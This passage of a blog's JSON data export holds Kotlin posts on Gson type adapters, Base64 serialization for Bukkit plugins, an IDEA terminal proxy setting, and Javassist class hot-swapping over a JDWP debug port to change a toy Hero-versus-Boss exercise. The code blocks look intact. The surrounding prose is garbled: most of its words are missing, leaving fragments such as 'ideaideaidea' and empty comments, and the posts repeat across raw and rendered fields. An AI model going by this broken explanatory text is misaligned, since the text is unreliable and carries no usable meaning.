Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<p><strong>json</strong><strong>base64</strong></p>\n<h2 id=\"Json\"><a href=\"#Json\" class=\"headerlink\" title=\"Json\"></a>Json</h2><p>Json<strong></strong></p>\n<p><strong>gson</strong><strong>fastjson</strong></p>\n<p>gsonSpigotgson</p>\n<p>gson</p>\n<p>&#x2F;</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> string<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> obj<span class=\"token operator\">:</span> Any <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">,</span> Any<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> str<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span><span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> list<span class=\"token operator\">:</span> ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span> <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span><span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> TypeToken<span class=\"token operator\">&lt;</span>ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span><span class=\"token operator\">></span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>gsonMapgson</p>\n<p></p>\n<p>{}<strong>NullPointerException</strong></p>\n<p></p>\n<p><strong>Kotlin</strong></p>\n<p></p>\n<p><strong>GsonGson</strong></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">//  TabooLib io.izzel.taboolib.kotlin.Serializer</span>\n<span class=\"token comment\">// TypeHierarchAdapter</span>\n    <span class=\"token keyword\">val</span> gson <span class=\"token operator\">=</span> <span class=\"token function\">GsonBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setPrettyPrinting</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">excludeFieldsWithoutExposeAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">&#123;</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>Location<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeLocation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>ItemStack<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeItemStack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>SecuredFile<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeSecuredFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>YamlConfiguration<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeYamlConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        SerializerAdapter<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span>\n\n<span class=\"token comment\">// TypeAdapter</span>\n<span class=\"token comment\">// LocationTypeAdapter</span>\n    <span class=\"token keyword\">class</span> TypeLocation <span class=\"token operator\">:</span> JsonSerializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> JsonDeserializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> Location<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonSerializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> JsonElement <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">JsonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">&#123;</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>world<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>z<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>yaw<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>pitch<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> JsonElement<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonDeserializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Location <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">Location</span><span class=\"token punctuation\">(</span>\n                Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getWorld</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>GsonBuilderAdapterGson&#x2F;</p>\n<p></p>\n<p></p>\n<p><strong>Base64</strong></p>\n<h2 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h2><p>base64gson&#x2F;</p>\n<p>JavaBase64</p>\n<p><strong>Json</strong></p>\n<p></p>\n<p>SQL</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// SacredHUD</span>\n<span class=\"token comment\">// Base64 encode</span>\n<span class=\"token keyword\">fun</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token function\">toBase64</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> byteArrayOutputStream <span class=\"token operator\">-></span>\n        <span class=\"token function\">BukkitObjectOutputStream</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> bukkitObjectOutputStream <span class=\"token operator\">-></span>\n            bukkitObjectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getEncoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// Base64 decode</span>\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">base64ToBitmapData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> byteArrayInputStream <span class=\"token operator\">-></span>\n        <span class=\"token function\">BukkitObjectInputStream</span><span class=\"token punctuation\">(</span>byteArrayInputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> bukkitObjectInputStream <span class=\"token operator\">-></span>\n            <span class=\"token keyword\">return</span> bukkitObjectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">></span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"IdeaTerminal","date":"2022-12-20T16:00:00.000Z","author":"","hide":false,"_content":"\n# IdeaTerminal\n\nideaPluginPlugin Marketgradlecargogitlinuxidea\n\nideaideaidea\n\nidea\n\n![image-20221221104523267](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png)\n\nideacargogradle","source":"_posts/idea-terminal-proxy.md","raw":"---\ntitle: IdeaTerminal\ndate: 2022-12-21\nauthor: \nhide: false\ncategories: \ntags:\n  - Idea\n---\n\n# IdeaTerminal\n\nideaPluginPlugin Marketgradlecargogitlinuxidea\n\nideaideaidea\n\nidea\n\n![image-20221221104523267](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png)\n\nideacargogradle","slug":"idea-terminal-proxy","published":1,"updated":"2022-12-21T02:47:02.616Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtl001isfkl24s4a9tv","content":"<h1 id=\"IdeaTerminal\"><a href=\"#IdeaTerminal\" class=\"headerlink\" title=\"IdeaTerminal\"></a>IdeaTerminal</h1><p>ideaPluginPlugin Marketgradlecargogitlinuxidea</p>\n<p>ideaideaidea</p>\n<p>idea</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png\" alt=\"image-20221221104523267\"></p>\n<p>ideacargogradle</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h1 id=\"IdeaTerminal\"><a href=\"#IdeaTerminal\" class=\"headerlink\" title=\"IdeaTerminal\"></a>IdeaTerminal</h1><p>ideaPluginPlugin Marketgradlecargogitlinuxidea</p>\n<p>ideaideaidea</p>\n<p>idea</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png\" alt=\"image-20221221104523267\"></p>\n<p>ideacargogradle</p>\n"},{"title":"Javassist & Javagent","date":"2021-11-18T16:00:00.000Z","author":"","hide":false,"summary":"Javassist","_content":"\n# Javassist & Javagent\n\n> level\n>\n> HeroBossBossHeroHeroBoss\n>\n> HeroBoss\n>\n> ASMJavassist\n>\n> Javassist\n>\n> \n\n## Javassist\n\n\n\n> JavaSystemClassLoaderClassLoaderClassLoadergcVM Options\n\n~~~\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000\n~~~\n\noptionsJavassistHotswapperVM\n\nOptions\n\n## \n\n~~~kotlin\n/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * \n *  javassist \n *\n * @author \n * @since 2021/11/18 10:58\n **/\nfun main() {\n    var hero: Entity = Hero()\n    val boss = Boss()\n//    bypass(hero)\n//    hero = javassistByPass(hero)\n    hotSwap()\n    if (boss.speed > hero.speed) {\n        // Boss  \n        println(\"Boss\")\n    } else {\n        // hero \n        if (hero.damage >= boss.health) {\n            println(\"Boss\")\n        } else {\n            println(\"BossBoss\")\n        }\n    }\n}\n\n/**\n * ()\n */\nfun bypass(hero: Entity) {\n    hero.setProperty(\"damage\", 999999)\n    hero.setProperty(\"speed\", 400)\n}\n\n// javassist\nfun javassistByPass(hero: Entity): Entity {\n    // ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // \n    ctClass.name = \"hk.asgard.rain.lesson4.lv4.HeroEdited\"\n    // ctClass\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    return ctClass.toClass().newInstance() as Entity\n}\n\n// \n// jvm -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 implementation tools.jar\nfun hotSwap() {\n    // ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // ctClass\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    val swap = HotSwapper(8000)\n    swap.reload(\"hk.asgard.rain.lesson4.lv4.Hero\", ctClass.toBytecode())\n}\n~~~\n\n## \n\n> HotSwapperJavassisttools.jar\n\n","source":"_posts/javassist-hotswap.md","raw":"---\ntitle: Javassist & Javagent\ndate: 2021-11-19\nauthor: \nhide: false\nsummary: Javassist\ncategories: \ntags:\n  - Kotlin\n  - Java\n  - \n  - \n---\n\n# Javassist & Javagent\n\n> level\n>\n> HeroBossBossHeroHeroBoss\n>\n> HeroBoss\n>\n> ASMJavassist\n>\n> Javassist\n>\n> \n\n## Javassist\n\n\n\n> JavaSystemClassLoaderClassLoaderClassLoadergcVM Options\n\n~~~\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000\n~~~\n\noptionsJavassistHotswapperVM\n\nOptions\n\n## \n\n~~~kotlin\n/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * \n *  javassist \n *\n * @author \n * @since 2021/11/18 10:58\n **/\nfun main() {\n    var hero: Entity = Hero()\n    val boss = Boss()\n//    bypass(hero)\n//    hero = javassistByPass(hero)\n    hotSwap()\n    if (boss.speed > hero.speed) {\n        // Boss  \n        println(\"Boss\")\n    } else {\n        // hero \n        if (hero.damage >= boss.health) {\n            println(\"Boss\")\n        } else {\n            println(\"BossBoss\")\n        }\n    }\n}\n\n/**\n * ()\n */\nfun bypass(hero: Entity) {\n    hero.setProperty(\"damage\", 999999)\n    hero.setProperty(\"speed\", 400)\n}\n\n// javassist\nfun javassistByPass(hero: Entity): Entity {\n    // ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // \n    ctClass.name = \"hk.asgard.rain.lesson4.lv4.HeroEdited\"\n    // ctClass\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    return ctClass.toClass().newInstance() as Entity\n}\n\n// \n// jvm -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 implementation tools.jar\nfun hotSwap() {\n    // ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // ctClass\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    val swap = HotSwapper(8000)\n    swap.reload(\"hk.asgard.rain.lesson4.lv4.Hero\", ctClass.toBytecode())\n}\n~~~\n\n## \n\n> HotSwapperJavassisttools.jar\n\n","slug":"javassist-hotswap","published":1,"updated":"2022-12-12T15:50:47.493Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtl001lsfkl21kf7x01","content":"<h1 id=\"Javassist-amp-Javagent\"><a href=\"#Javassist-amp-Javagent\" class=\"headerlink\" title=\"Javassist &amp; Javagent\"></a>Javassist &amp; Javagent</h1><blockquote>\n<p>level</p>\n<p>HeroBossBossHeroHeroBoss</p>\n<p>HeroBoss</p>\n<p>ASMJavassist</p>\n<p>Javassist</p>\n<p></p>\n</blockquote>\n<h2 id=\"Javassist\"><a href=\"#Javassist\" class=\"headerlink\" title=\"Javassist\"></a>Javassist</h2><p></p>\n<blockquote>\n<p>JavaSystemClassLoaderClassLoaderClassLoadergcVM Options</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>optionsJavassistHotswapperVM</p>\n<p>Options</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * \n *  javassist \n *\n * @author \n * @since 2021/11/18 10:58\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> hero<span class=\"token operator\">:</span> Entity <span class=\"token operator\">=</span> <span class=\"token function\">Hero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> boss <span class=\"token operator\">=</span> <span class=\"token function\">Boss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//    bypass(hero)</span>\n<span class=\"token comment\">//    hero = javassistByPass(hero)</span>\n    <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>boss<span class=\"token punctuation\">.</span>speed <span class=\"token operator\">&gt;</span> hero<span class=\"token punctuation\">.</span>speed<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Boss  </span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Boss\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// hero </span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hero<span class=\"token punctuation\">.</span>damage <span class=\"token operator\">&gt;=</span> boss<span class=\"token punctuation\">.</span>health<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Boss\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"BossBoss\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">/**\n * ()\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">bypass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"damage\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"speed\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// javassist</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistByPass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Entity <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctClass<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.HeroEdited\"</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 999999L;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token 